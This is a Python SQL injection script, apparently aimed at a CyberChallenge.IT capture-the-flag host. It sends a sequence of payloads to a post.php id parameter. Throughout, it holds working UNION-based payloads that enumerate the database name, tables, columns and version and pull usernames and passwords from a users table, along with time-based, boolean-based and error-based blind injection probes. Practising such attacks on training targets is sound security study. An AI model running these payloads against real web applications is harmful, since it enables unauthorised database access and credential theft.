import requests

class Inj:
    def __init__(self, host):
        self.sess = requests.Session()  # Start the session to save cookies
        self.base_url = '{}/post.php?id='.format(host)

    def inject(self, payload):
        url = self.base_url + payload
        response = self.sess.get(url)
        return response.text

host = "http://filtered.challs.cyberchallenge.it"
attacker = Inj(host)

# Test UNION SQL Injection
payload = "1' UNION SELECT database(), null -- "
print(attacker.inject(payload))
payload = "1' UNION SELECT table_name, null FROM information_schema.tables -- "
print("\n\n")
print(attacker.inject(payload))

# Test UNION SQL Injection
print("Testing UNION SQL Injection...")

# Get the current database
payload = "1' UNION SELECT database(), null -- "
print("Payload: ", payload)
print(attacker.inject(payload))

# Get all table names from the information_schema
payload = "1' UNION SELECT table_name, null FROM information_schema.tables -- "
print("\nTesting table names in the database...")
print("Payload: ", payload)
print(attacker.inject(payload))

# Get column names for a specific table (replace 'table_name' with the table you find)
payload = "1' UNION SELECT column_name, null FROM information_schema.columns WHERE table_name='table_name' -- "
print("\nTesting column names in table 'table_name'...")
print("Payload: ", payload)
print(attacker.inject(payload))

# Attempt to get the version of the database
payload = "1' UNION SELECT version(), null -- "
print("\nTesting database version...")
print("Payload: ", payload)
print(attacker.inject(payload))

# Try to find users in the database (this can vary depending on the DBMS)
payload = "1' UNION SELECT username, password FROM users -- "
print("\nTesting if there are user credentials...")
print("Payload: ", payload)
print(attacker.inject(payload))

# Check if the DB supports time-based blind injection
payload = "1' AND IF(1=1, SLEEP(5), 0) -- "
print("\nTesting for time-based blind injection (should delay response)...")
print("Payload: ", payload)
print(attacker.inject(payload))

# Try to fetch more tables if the first query does not show all of them
payload = "1' UNION SELECT table_name, null FROM information_schema.tables WHERE table_schema='public' -- "
print("\nFetching tables in 'public' schema...")
print("Payload: ", payload)
print(attacker.inject(payload))

# Attempt a boolean-based blind injection (checking if a condition is true)
payload = "1' AND 1=1 -- "
print("\nTesting for boolean-based blind injection (should return a normal page)...")
print("Payload: ", payload)
print(attacker.inject(payload))

# Testing for an error-based injection that may provide further hints
payload = "1' AND 1=2 -- "
print("\nTesting error-based injection (should return an error if vulnerable)...")
print("Payload: ", payload)
print(attacker.inject(payload))

# Try to fetch data from any table (replace 'any_table' with the table found earlier)
payload = "1' UNION SELECT * FROM any_table -- "
print("\nTesting SELECT * from any_table...")
print("Payload: ", payload)
print(attacker.inject(payload))

# Get the first column of a table
payload = "1' UNION SELECT 1, null -- "
print("\nTesting SELECT 1 column...")
print("Payload: ", payload)
print(attacker.inject(payload))

# Try out different comment styles
payload = "1' UNION SELECT null, null -- "
print("\nTesting with another simple UNION payload...")
print("Payload: ", payload)
print(attacker.inject(payload))

# Error-based test
payload = "1' AND 1=1 GROUP BY column_name HAVING 1=1 -- "
print("\nTesting for error-based GROUP BY...") 
print("Payload: ", payload)
print(attacker.inject(payload))